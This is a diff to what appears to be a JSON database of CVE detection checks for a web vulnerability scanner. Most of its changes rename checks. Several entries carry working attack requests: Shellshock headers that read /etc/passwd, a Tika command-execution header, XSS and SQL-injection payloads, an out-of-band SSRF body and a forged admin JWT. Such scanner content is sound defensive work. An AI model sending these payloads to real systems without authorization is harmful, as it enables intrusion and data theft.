@@ -479,7 +479,7 @@
     {
       "id": "CVE-2009-3318",
       "info": {
-        "name": "Joomla! Component com_album 1.14 - Directory Traversal",
+        "name": "Joomla! Roland Breedveld Album 1.14 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -494,7 +494,7 @@
     {
       "id": "CVE-2009-4202",
       "info": {
-        "name": "Joomla! Component Omilen Photo Gallery 0.5b - Local File Inclusion",
+        "name": "Joomla! Omilen Photo Gallery 0.5b - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -509,7 +509,7 @@
     {
       "id": "CVE-2009-4223",
       "info": {
-        "name": "KR-Web <= 1.1b2 RFI",
+        "name": "KR-Web <=1.1b2 - Remote File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -524,7 +524,7 @@
     {
       "id": "CVE-2009-4679",
       "info": {
-        "name": "Joomla! Component iF Portfolio Nexus - 'Controller' Remote File Inclusion",
+        "name": "Joomla! Portfolio Nexus - Remote File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3540,7 +3540,7 @@
     {
       "id": "CVE-2015-0554",
       "info": {
-        "name": "Pirelli ADSL2/2+ Wireless Router P.DGA4001N - Information Disclosure",
+        "name": "ADB/Pirelli ADSL2/2+ Wireless Router P.DGA4001N - Information Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -3555,7 +3555,7 @@
     {
       "id": "CVE-2015-1000012",
       "info": {
-        "name": "MyPixs <= 0.3 - Unauthenticated Local File Inclusion (LFI)",
+        "name": "WordPress MyPixs <=0.3 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3585,7 +3585,7 @@
     {
       "id": "CVE-2015-1503",
       "info": {
-        "name": "IceWarp Mail Server Directory Traversal",
+        "name": "IceWarp Mail Server <11.1.1 - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -3616,7 +3616,7 @@
     {
       "id": "CVE-2015-2067",
       "info": {
-        "name": "Magento Server Magmi Plugin - Directory Traversal",
+        "name": "Magento Server MAGMI - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -3664,7 +3664,7 @@
     {
       "id": "CVE-2015-2166",
       "info": {
-        "name": "Ericsson Drutt MSDP (Instance Monitor) Directory Traversal",
+        "name": "Ericsson Drutt MSDP - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3712,7 +3712,7 @@
     {
       "id": "CVE-2015-3306",
       "info": {
-        "name": "ProFTPd RCE",
+        "name": "ProFTPd - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -3730,7 +3730,7 @@
     {
       "id": "CVE-2015-3337",
       "info": {
-        "name": "Elasticsearch Head plugin LFI",
+        "name": "Elasticsearch - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3760,7 +3760,7 @@
     {
       "id": "CVE-2015-3897",
       "info": {
-        "name": "Bonita BPM 6.5.1 - Unauthenticated Directory Traversal",
+        "name": "Bonita BPM Portal <6.5.3 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3776,7 +3776,7 @@
     {
       "id": "CVE-2015-4050",
       "info": {
-        "name": "ESI unauthorized access",
+        "name": "Symfony - Authentication Bypass",
         "severity": "high"
       },
       "requests": [
@@ -3791,7 +3791,7 @@
     {
       "id": "CVE-2015-4414",
       "info": {
-        "name": "WordPress Plugin SE HTML5 Album Audio Player 1.1.0 - Directory Traversal",
+        "name": "WordPress SE HTML5 Album Audio Player 1.1.0 - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -3881,7 +3881,7 @@
     {
       "id": "CVE-2015-5531",
       "info": {
-        "name": "ElasticSearch directory traversal vulnerability (CVE-2015-5531)",
+        "name": "ElasticSearch <1.6.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3897,7 +3897,7 @@
     {
       "id": "CVE-2015-5688",
       "info": {
-        "name": "Geddy before v13.0.8 LFI",
+        "name": "Geddy <13.0.8 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3958,7 +3958,7 @@
     {
       "id": "CVE-2015-7297",
       "info": {
-        "name": "Joomla Core SQL Injection",
+        "name": "Joomla! Core SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -4062,7 +4062,7 @@
     {
       "id": "CVE-2015-8813",
       "info": {
-        "name": "Umbraco SSRF Vulnerability in Feedproxy.aspx",
+        "name": "Umbraco <7.4.0- Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -4107,7 +4107,7 @@
     {
       "id": "CVE-2016-0957",
       "info": {
-        "name": "Adobe AEM Console Disclosure",
+        "name": "Adobe AEM Dispatcher <4.15 - Rules Bypass",
         "severity": "high"
       },
       "requests": [
@@ -4530,7 +4530,7 @@
     {
       "id": "CVE-2016-10924",
       "info": {
-        "name": "Wordpress eBook Download < 1.2 - Directory Traversal",
+        "name": "Wordpress Zedna eBook download <1.2 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4561,7 +4561,7 @@
     {
       "id": "CVE-2016-10956",
       "info": {
-        "name": "Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)",
+        "name": "WordPress Mail Masta 1.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4636,7 +4636,7 @@
     {
       "id": "CVE-2016-2389",
       "info": {
-        "name": "SAP xMII 15.0 - Directory Traversal",
+        "name": "SAP xMII 15.0 for SAP NetWeaver 7.4 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4651,7 +4651,7 @@
     {
       "id": "CVE-2016-3081",
       "info": {
-        "name": "Apache S2-032 Struts RCE",
+        "name": "Apache S2-032 Struts - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -4757,7 +4757,7 @@
     {
       "id": "CVE-2016-6277",
       "info": {
-        "name": "NETGEAR routers (including R6400, R7000, R8000 and similar) RCE",
+        "name": "NETGEAR Routers - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -4820,7 +4820,7 @@
     {
       "id": "CVE-2017-0929",
       "info": {
-        "name": "DotNetNuke ImageHandler SSRF",
+        "name": "DotNetNuke (DNN) ImageHandler <9.2.0 - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -4835,7 +4835,7 @@
     {
       "id": "CVE-2017-1000028",
       "info": {
-        "name": "GlassFish LFI",
+        "name": "Oracle GlassFish Server Open Source Edition 4.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4851,7 +4851,7 @@
     {
       "id": "CVE-2017-1000029",
       "info": {
-        "name": "GlassFish Server Open Source Edition 3.0.1 - LFI",
+        "name": "Oracle GlassFish Server Open Source Edition 3.0.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4866,7 +4866,7 @@
     {
       "id": "CVE-2017-1000170",
       "info": {
-        "name": "WordPress Plugin Delightful Downloads Jquery File Tree 2.1.5 Path Traversal",
+        "name": "WordPress Delightful Downloads Jquery File Tree 2.1.5 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4927,7 +4927,7 @@
     {
       "id": "CVE-2017-10974",
       "info": {
-        "name": "Yaws 1.91 - Remote File Disclosure",
+        "name": "Yaws 1.91 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -4957,7 +4957,7 @@
     {
       "id": "CVE-2017-11512",
       "info": {
-        "name": "ManageEngine ServiceDesk - Arbitrary File Retrieval",
+        "name": "ManageEngine ServiceDesk 9.3.9328 - Arbitrary File Retrieval",
         "severity": "high"
       },
       "requests": [
@@ -4973,7 +4973,7 @@
     {
       "id": "CVE-2017-11610",
       "info": {
-        "name": "Supervisor XMLRPC Exec",
+        "name": "XML-RPC Server - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -5080,7 +5080,7 @@
     {
       "id": "CVE-2017-12615",
       "info": {
-        "name": "Apache Tomcat RCE",
+        "name": "Apache Tomcat Servers - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -5134,7 +5134,7 @@
     {
       "id": "CVE-2017-12637",
       "info": {
-        "name": "Directory traversal vulnerability in SAP NetWeaver Application Server Java 7.5",
+        "name": "SAP NetWeaver Application Server Java 7.5 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -5222,7 +5222,7 @@
     {
       "id": "CVE-2017-14849",
       "info": {
-        "name": "Node.js 8.5.0 >=< 8.6.0 Directory Traversal",
+        "name": "Node.js <8.6.0 - Directory Traversal",
         "severity": "high"
       },
       "requests": [
@@ -5251,7 +5251,7 @@
     {
       "id": "CVE-2017-15363",
       "info": {
-        "name": "TYPO3 Restler - Arbitrary File Retrieval",
+        "name": "Luracast Restler 3.0.1 via TYPO3 Restler 1.7.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -5266,7 +5266,7 @@
     {
       "id": "CVE-2017-15647",
       "info": {
-        "name": "FiberHome - Directory Traversal",
+        "name": "FiberHome Routers - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -5281,7 +5281,7 @@
     {
       "id": "CVE-2017-15715",
       "info": {
-        "name": "Apache Arbitrary File Upload",
+        "name": "Apache httpd <=2.4.29 - Arbitrary File Upload",
         "severity": "high"
       },
       "requests": [
@@ -5326,7 +5326,7 @@
     {
       "id": "CVE-2017-16877",
       "info": {
-        "name": "Nextjs v2.4.1 LFI",
+        "name": "Nextjs <2.4.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6005,6 +6005,21 @@
       ]
     },
     {
+      "id": "CVE-2018-10230",
+      "info": {
+        "name": "Zend Server < 9.13 - XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?debug_host=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&start_debug=1"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-10562",
       "info": {
         "name": "Dasan GPON Devices - Remote Code Execution",
@@ -6360,11 +6375,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -9322,7 +9337,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/webapp/?fccc%27\\%22%3E%3Csvg/onload=alert(xss)%3E"
+            "{{BaseURL}}/webapp/?fccc%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E"
           ]
         }
       ]
@@ -9495,8 +9510,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -10699,7 +10714,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/control/stream?contentId=%27\\%22%3E%3Csvg/onload=alert(xss)%3E"
+            "{{BaseURL}}/control/stream?contentId=%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E"
           ]
         }
       ]
@@ -11176,9 +11191,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -11552,7 +11567,7 @@
     {
       "id": "CVE-2020-29597",
       "info": {
-        "name": "IncomCMS 2.0 - Arbitary files upload",
+        "name": "IncomCMS 2.0 - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -15816,6 +15831,22 @@
         {
           "raw": [
             "GET /dashboardUser HTTP/1.1\nHost: {{Hostname}}\nX-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjM3MjY1MTIxfQ.-jjw2bGyQxna5Soe4fLVLaD3gUT5ALTcsvutPQoE2qk\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-37589",
+      "info": {
+        "name": "Virtua Software Cobrança - Firebird Blind SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /controller/origemdb.php?idselorigem=ATIVOS HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n",
+            "POST /controller/login.php?acao=autenticar HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\n\nidusuario='&idsenha=test&tipousr=Usuario\n",
+            "POST /controller/login.php?acao=autenticar HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\n\nidusuario=''&idsenha=a&tipousr=Usuario\n"
           ]
         }
       ]
